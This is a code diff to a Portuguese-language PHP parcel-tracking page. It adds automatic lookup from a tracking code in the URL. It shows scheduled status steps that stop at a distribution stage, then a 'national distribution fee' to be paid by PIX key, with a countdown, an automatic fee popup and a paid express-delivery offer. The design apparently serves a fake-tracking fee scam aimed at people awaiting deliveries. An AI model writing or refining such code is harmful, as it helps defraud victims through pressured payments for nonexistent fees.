@@ -21,6 +21,59 @@ $temTaxa = false;
 $tempoLimite = 24;
 $expressValor = getDynamicConfig('EXPRESS_FEE_VALUE', 29.90);
 $isExpress = false;
+$autoLoadFromUrl = false;
+
+// Verificar se há código na URL (GET) e buscar cidade automaticamente
+if (isset($_GET['codigo']) && !isset($_POST['codigo'])) {
+    $codigoFromUrl = strtoupper(trim(sanitizeInput($_GET['codigo'])));
+    if (!empty($codigoFromUrl)) {
+        try {
+            $sql = "SELECT DISTINCT cidade FROM rastreios_status WHERE UPPER(TRIM(codigo)) = ? AND cidade IS NOT NULL AND cidade != '' LIMIT 1";
+            $stmt = $pdo->prepare($sql);
+            $stmt->execute([$codigoFromUrl]);
+            $row = $stmt->fetch();
+            
+            if ($row && !empty($row['cidade'])) {
+                $codigo = $codigoFromUrl;
+                $cidade = trim($row['cidade']);
+                $autoLoadFromUrl = true;
+                
+                // Executar consulta automaticamente
+                $sql = "SELECT * FROM rastreios_status WHERE UPPER(TRIM(codigo)) = ? ORDER BY data ASC";
+                $stmt = $pdo->prepare($sql);
+                $stmt->execute([$codigo]);
+                $results = $stmt->fetchAll();
+
+                if (!empty($results)) {
+                    $rows = [];
+                    foreach ($results as $row) {
+                        if (strtotime($row['data']) <= time()) {
+                            $rows[] = $row;
+                            if (strpos(strtolower($row['titulo']), 'distribuição') !== false) break;
+                        }
+                    }
+
+                    if (!empty($rows) && strcasecmp(trim($rows[0]['cidade']), $cidade) === 0) {
+                        $statusList = $rows;
+                        foreach ($rows as $r) {
+                            if (!empty($r['taxa_valor']) && !empty($r['taxa_pix'])) {
+                                $temTaxa = true;
+                            }
+                            if (!empty($r['prioridade'])) { $isExpress = true; }
+                        }
+                        $statusAtualTopo = $temTaxa ? "⏳ Aguardando pagamento da taxa" : end($statusList)['status_atual'];
+                    } else {
+                        $erroCidade = "⚠️ A cidade informada não confere com este código!";
+                    }
+                } else {
+                    $erroCidade = "❌ Código inexistente!";
+                }
+            }
+        } catch (PDOException $e) {
+            writeLog("Erro ao buscar código da URL: " . $e->getMessage(), 'ERROR');
+        }
+    }
+}
 
 if (isset($_POST['codigo']) && isset($_POST['cidade'])) {
     $codigo = strtoupper(trim(sanitizeInput($_POST['codigo'])));
@@ -676,11 +729,11 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0A
             <form method="POST" action="index.php">
                 <div class="form-group">
                     <label for="codigo">Código de Rastreamento</label>
-                    <input type="text" name="codigo" id="codigo" placeholder="Digite o código" maxlength="12" required>
+                    <input type="text" name="codigo" id="codigo" placeholder="Digite o código" maxlength="12" value="<?= htmlspecialchars($codigo) ?>" required>
                 </div>
                 <div class="form-group">
                     <label for="cidade">Cidade</label>
-                    <input type="text" name="cidade" id="cidade" placeholder="Digite a cidade" required>
+                    <input type="text" name="cidade" id="cidade" placeholder="Digite a cidade" value="<?= htmlspecialchars($cidade) ?>" required>
                 </div>
                 <button type="submit" class="btn-primary">
                     <i class="fas fa-search"></i> Rastrear
@@ -688,7 +741,54 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0A
             </form>
         </div>
         <!-- Resultados AJAX sem recarregar -->
-        <div id="ajaxResults"></div>
+        <div id="ajaxResults">
+            <?php if (!empty($statusList)): ?>
+            <div class="results">
+                <div class="results-box">
+                    <div class="status">
+                        📦 Status atual: <?= htmlspecialchars($statusAtualTopo) ?> — <?= htmlspecialchars($cidade) ?>
+                        <?php if ($isExpress): ?>
+                        <span class="badge"><i class="fas fa-bolt"></i> Entrega Expressa</span>
+                        <?php endif; ?>
+                    </div>
+                    <div class="timeline">
+                        <?php foreach ($statusList as $etapa): ?>
+                        <div class="step" style="border-left-color:<?= htmlspecialchars($etapa['cor'] ?? '#16A34A') ?>;">
+                            <b><?= htmlspecialchars($etapa['titulo']) ?></b>
+                            <small><?= htmlspecialchars($etapa['subtitulo']) ?></small>
+                            <i><?= date("d/m/Y H:i", strtotime($etapa['data'])) ?></i>
+
+                            <?php if (!empty($etapa['taxa_valor']) && !empty($etapa['taxa_pix'])): ?>
+                            <div class="pix-box">
+                                <p>💰 <b>Taxa de distribuição nacional:</b> R$ <?= number_format($etapa['taxa_valor'], 2, ',', '.') ?></p>
+                                <p>Faça o pagamento via PIX:</p>
+                                <textarea readonly><?= htmlspecialchars($etapa['taxa_pix']) ?></textarea>
+                                <button onclick="navigator.clipboard.writeText('<?= htmlspecialchars($etapa['taxa_pix'], ENT_QUOTES) ?>')">
+                                    📋 Copiar chave PIX
+                                </button>
+                                <?php if ($temTaxa): ?>
+                                <div id="countdown" class="countdown"></div>
+                                <?php endif; ?>
+                            </div>
+                            <?php endif; ?>
+                        </div>
+                        <?php endforeach; ?>
+                    </div>
+                    <?php if (!$temTaxa && !$isExpress): ?>
+                    <div class="pix-box express-offer" style="margin-top: 1rem;">
+                        <p><b>Entrega Expressa (3 dias)</b> — antecipe sua entrega por apenas R$ <?= number_format($expressValor, 2, ',', '.') ?>.</p>
+                        <p>Efetue o pagamento via PIX após solicitar. Confirmação rápida.</p>
+                        <button class="btn-cta-express" data-tooltip="Entrega em 3 dias após confirmação" onclick='solicitarExpress(<?= json_encode($codigo) ?>, <?= json_encode($cidade) ?>, this)'>⚡ Quero entrega em 3 dias</button>
+                    </div>
+                    <?php endif; ?>
+                </div>
+            </div>
+            <?php elseif (!empty($erroCidade)): ?>
+            <div class="results">
+                <div class="erro"><?= htmlspecialchars($erroCidade) ?></div>
+            </div>
+            <?php endif; ?>
+        </div>
         
         <div class="hero-content">
             <div class="hero-title-card">
@@ -785,55 +885,10 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0A
     </div>
 </section>
 
-<?php if (!empty($erroCidade)): ?>
-<div class="results">
-    <div class="erro"><?= $erroCidade ?></div>
-</div>
-<?php endif; ?>
-
-<?php if (!empty($statusList)): ?>
-<div class="results">
-    <div class="results-box">
-        <div class="status">
-            📦 Status atual: <?= $statusAtualTopo ?> — <?= $cidade ?>
-        </div>
-        <div class="timeline">
-            <?php foreach ($statusList as $etapa): ?>
-                <div class="step" style="border-left-color:<?= $etapa['cor'] ?? '#16A34A'; ?>;">
-                    <b><?= htmlspecialchars($etapa['titulo']) ?></b>
-                    <small><?= htmlspecialchars($etapa['subtitulo']) ?></small>
-                    <i><?= date("d/m/Y H:i", strtotime($etapa['data'])) ?></i>
-
-                    <?php if (!empty($etapa['taxa_valor']) && !empty($etapa['taxa_pix'])): ?>
-                        <div class="pix-box">
-                            <p>💰 <b>Taxa de distribuição nacional:</b> R$ <?= number_format($etapa['taxa_valor'], 2, ',', '.') ?></p>
-                            <p>Faça o pagamento via PIX:</p>
-                            <textarea readonly><?= htmlspecialchars($etapa['taxa_pix']) ?></textarea>
-                            <button onclick="navigator.clipboard.writeText('<?= htmlspecialchars($etapa['taxa_pix'], ENT_QUOTES) ?>')">
-                                📋 Copiar chave PIX
-                            </button>
-                            <?php if ($temTaxa): ?>
-                                <div id="countdown" class="countdown"></div>
-                            <?php endif; ?>
-                        </div>
-                    <?php endif; ?>
-                </div>
-            <?php endforeach; ?>
-        </div>
-        <?php if (!$temTaxa): ?>
-            <div class="pix-box express-offer" style="margin-top: 1rem;">
-                <p><b>Entrega Expressa (3 dias)</b> — antecipe sua entrega por apenas R$ <?= number_format($expressValor, 2, ',', '.') ?>.</p>
-                <p>Efetue o pagamento via PIX após solicitar. Confirmação rápida.</p>
-                <button class="btn-cta-express" data-tooltip="Entrega em 3 dias após confirmação" onclick='solicitarExpress(<?= json_encode($codigo) ?>, <?= json_encode($cidade) ?>, this)'>⚡ Quero entrega em 3 dias</button>
-            </div>
-        <?php endif; ?>
-    </div>
-</div>
-<?php endif; ?>
 
 <?php
 // Exibir popup explicativo automaticamente no render completo quando houver taxa
-if (!empty($statusList) && $temTaxa && !empty($popupTaxaEnabled)) {
+if (!empty($statusList) && $temTaxa && $autoLoadFromUrl) {
     $taxaValorPrimeira = null;
     foreach ($statusList as $etapa) {
         if (!empty($etapa['taxa_valor'])) {
@@ -973,19 +1028,31 @@ document.querySelectorAll('.mobile-menu a').forEach(link => {
 
 // Submissão AJAX do formulário de rastreio
 document.addEventListener('DOMContentLoaded', function() {
-    // Preencher código automaticamente se vier na URL
-    const urlParams = new URLSearchParams(window.location.search);
-    const codigoFromUrl = urlParams.get('codigo');
-    if (codigoFromUrl) {
-        const codigoInput = document.getElementById('codigo');
-        if (codigoInput) {
-            codigoInput.value = decodeURIComponent(codigoFromUrl);
-        }
-    }
-
     const form = document.querySelector('form[method="POST"][action="index.php"]');
     const results = document.getElementById('ajaxResults');
     const submitBtn = form ? form.querySelector('button[type="submit"]') : null;
+    
+    // Se os dados vieram da URL, os resultados já foram renderizados pelo PHP
+    // Apenas garantir que o countdown e popup funcionem se necessário
+    <?php if ($autoLoadFromUrl && !empty($statusList)): ?>
+    setTimeout(function() {
+        try {
+            startCountdownIfPresent();
+            <?php if ($temTaxa): ?>
+            const pixTextarea = document.querySelector('.pix-box textarea');
+            if (pixTextarea && typeof showTaxaPopup === 'function') {
+                let valorTexto = null;
+                const p = pixTextarea.closest('.pix-box') ? pixTextarea.closest('.pix-box').querySelector('p') : null;
+                if (p && /R\$\s*[0-9\.,]+/.test(p.textContent)) {
+                    const m = p.textContent.match(/R\$\s*[0-9\.,]+/);
+                    valorTexto = m ? m[0] : null;
+                }
+                showTaxaPopup(valorTexto);
+            }
+            <?php endif; ?>
+        } catch (_) { /* silencioso */ }
+    }, 200);
+    <?php endif; ?>
 
     if (form && results && submitBtn) {
         form.addEventListener('submit', async function(e) {
